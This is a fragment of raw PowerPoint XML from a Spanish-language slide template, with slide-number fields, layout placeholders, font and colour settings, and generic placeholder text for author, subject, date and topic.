            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="179629059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78</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8132506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79</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="64635541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80</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="195730164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81</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35086786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82</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="209840003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83</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="298148896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84</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="323530259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85</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="322376107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86</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42194191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87</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="411722878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88</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15872294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89</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="384331714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90</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="264508551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91</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="264508551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ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6148"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75397D2-6195-48CB-8E9E-29C6555BF34E}" type="slidenum">
              <a:rPr lang="es-ES" altLang="es-ES" smtClean="0"/>
              <a:pPr/>
              <a:t>92</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="119004895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93</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="134330691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94</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="418785730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Marcador de imagen d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Marcador de nota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s-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8196" name="Marcador de número de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85372" indent="-302066">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1208265" indent="-241653">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1691571" indent="-241653">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2174878" indent="-241653">
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs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C5FF534-BE54-4C3F-8ACC-CF0D97819DB8}" type="slidenum">
              <a:rPr lang="es-ES" altLang="es-ES" smtClean="0"/>
              <a:pPr/>
              <a:t>95</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES" altLang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16001715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58193" y="1344305"/>
            <a:ext cx="9638646" cy="2387600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="4400">
                <a:solidFill>
                  <a:srgbClr val="004E9A"/>
                </a:solidFill>
                <a:latin typeface="Arial Black" panose="020B0A04020102020204" pitchFamily="34" charset="0"/>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8193" y="3731906"/>
            <a:ext cx="9029046" cy="982138"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="l">
              <a:buNone/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="83838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11" name="Marcador de texto 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9D916A99-4E67-4EE0-8D7D-880C2C5C58DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="10" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1158194" y="5254858"/>
            <a:ext cx="4632779" cy="1474787"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl5pPr marL="1828800" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="ca-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AUTOR DEL DOCUMENTO </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="ca-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Asignatura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ca-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:rPr>
              <a:t> del documento </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="ca-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fecha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ca-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ca-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="838383"/>
                </a:solidFill>
              </a:rPr>
              <a:t>elaboración</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="838383"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2985186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Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA7C69CD-A5B3-4FC4-B8E5-B65D0C6B43AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="16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tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80658DE3-2342-4DBF-AE04-5731FAB373E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6560598"/>
            <a:ext cx="5400431" cy="297402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="12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documento</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="749367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Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8DBCBE1F-F9EE-490B-8A51-BE63E919AE88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="16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tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA6256E9-0408-4123-86DA-F581F616EA42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6560598"/>
            <a:ext cx="5400431" cy="297402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="12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documento</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3911555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9" y="866779"/>
            <a:ext cx="10515600" cy="814385"/>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90"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90"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9" name="Slide Number Placeholder 8"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6806BCC8-FED1-48C3-A239-01EAA1183F4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="16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tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A6975A3D-E158-4E26-8254-10AEEA918C05}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6560598"/>
            <a:ext cx="5400431" cy="297402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="12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documento</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3671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5" name="Slide Number Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45F7DEDC-92E8-4AB7-885B-E03AB0C4FF89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="16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tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{55410DE9-6B68-42DF-B5C7-3612C932C6AC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6560598"/>
            <a:ext cx="5400431" cy="297402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="12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documento</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2591762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5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60C0FD65-FD87-4A89-A18B-AAC38AD67E62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="16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tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5CA99008-5AD7-4E48-B719-D67D9E288952}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="14" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="6560598"/>
            <a:ext cx="5400431" cy="297402"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="12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documento</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4018209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9" y="987427"/>
            <a:ext cx="3932238" cy="1069973"/>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8"/>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9" y="2057400"/>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7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A5F6AD21-0C94-462B-849C-96F42247F048}" type="slidenum">
              <a:rPr lang="es-ES" smtClean="0"/>
              <a:t>‹Nº›</a:t>
            </a:fld>
            <a:endParaRPr lang="es-ES"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{564AD844-721D-4E8E-807B-CE109D5A7B51}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838201" y="230819"/>
            <a:ext cx="5400431" cy="320044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr sz="16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tema</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Marcador de texto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6DB55C13-6F34-4397-B394-424830AC06FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
